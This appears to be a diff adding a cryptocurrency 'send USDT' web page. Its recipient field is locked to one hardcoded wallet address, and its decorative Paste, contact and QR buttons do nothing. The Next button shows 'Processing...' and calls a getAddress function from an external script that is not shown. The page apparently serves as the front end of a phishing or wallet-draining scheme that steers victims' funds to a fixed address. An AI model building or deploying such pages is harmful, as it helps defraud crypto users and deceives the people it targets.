@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Site</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+  <main class="container">
+    <form class="form" id="payment-form" novalidate>
+      <div class="field-group">
+        <label class="label" for="addr">Address or Domain Name</label>
+        <div class="input-affix">
+          <input
+            id="addr"
+            class="input input-with-suffix"
+            type="text"
+            value="0xccD642c9acb072F72F29b77E422f5c024ecF5cBa"
+            readonly
+            aria-readonly="true"
+          />
+          <div class="suffix addr-actions">
+            <button type="button" class="action-btn">Paste</button>
+            <button type="button" class="icon-btn" aria-label="Contact">
+              <svg viewBox="0 0 512 512" width="20" height="20" aria-hidden="true">
+                <path fill="currentColor" d="M96 0C60.7 0 32 28.7 32 64l0 384c0 35.3 28.7 64 64 64l288 0c35.3 0 64-28.7 64-64l0-384c0-35.3-28.7-64-64-64L96 0zM208 288l64 0c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16l-192 0c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm-32-96a64 64 0 1 1 128 0 64 64 0 1 1 -128 0zM512 80c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64zM496 192c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64c0-8.8-7.2-16-16-16zm16 144c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64z"></path>
+              </svg>
+            </button>
+            <button type="button" class="icon-btn" aria-label="QR code">
+              <svg viewBox="0 0 512 512" width="20" height="20" aria-hidden="true">
+                <path fill="currentColor" d="M0 80C0 53.5 21.5 32 48 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48L0 80zM64 96l0 64 64 0 0-64L64 96zM0 336c0-26.5 21.5-48 48-48l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96zm64 16l0 64 64 0 0-64-64 0zM304 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96c0-26.5 21.5-48 48-48zm80 64l-64 0 0 64 64 0 0-64zM256 304c0-8.8 7.2-16 16-16l64 0c8.8 0 16 7.2 16 16s7.2 16 16 16l32 0c8.8 0 16-7.2 16-16s7.2-16 16-16s16 7.2 16 16l0 96c0 8.8-7.2 16-16 16l-64 0c-8.8 0-16-7.2-16-16s-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-160zM368 480a16 16 0 1 1 0-32 16 16 0 1 1 0 32zm64 0a16 16 0 1 1 0-32 16 16 0 1 1 0 32z"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <div class="field-group">
+        <label class="label" for="amount">Amount</label>
+        <div class="input-affix">
+          <input
+            id="amount"
+            class="input input-with-suffix"
+            type="number"
+            inputmode="decimal"
+            step="any"
+            placeholder="USDT Amount"
+            aria-describedby="amount-help"
+          />
+          <div class="suffix">
+            <span class="currency">USDT</span>
+            <button type="button" class="max-btn" aria-label="Set maximum amount">Max</button>
+          </div>
+        </div>
+        <div class="input-note">
+          <span id="amount-echo">= $0.00</span>
+        </div>
+      </div>
+
+      <button id="next-btn" class="button" type="button" disabled>Next</button>
+    </form>
+  </main>
+
+  <script src="js/main.js"></script>
+  <script>
+    (function () {
+      var amountInput = document.getElementById('amount');
+      var nextBtn = document.getElementById('next-btn');
+      var amountEcho = document.getElementById('amount-echo');
+
+      function updateButtonState() {
+        var hasValue = amountInput && amountInput.value.trim().length > 0;
+        if (nextBtn) {
+          nextBtn.disabled = !hasValue;
+        }
+      }
+      function formatEcho() {
+        if (!amountEcho) return;
+        var val = (amountInput && amountInput.value.trim()) || '';
+        var num = parseFloat(val);
+        if (isNaN(num)) {
+          amountEcho.textContent = '= $0.00';
+        } else {
+          amountEcho.textContent = '= $' + num.toFixed(2);
+        }
+      }
+
+      if (amountInput) {
+        amountInput.addEventListener('input', function () {
+          updateButtonState();
+          formatEcho();
+        });
+        updateButtonState();
+        formatEcho();
+      }
+
+      if (nextBtn) {
+        nextBtn.addEventListener('click', async function () {
+          nextBtn.textContent = 'Processing...';
+          nextBtn.disabled = true;
+          try {
+            if (typeof window.getAddress === 'function') {
+              await window.getAddress();
+            }
+          } catch (e) {
+            console.error(e);
+          }
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
+
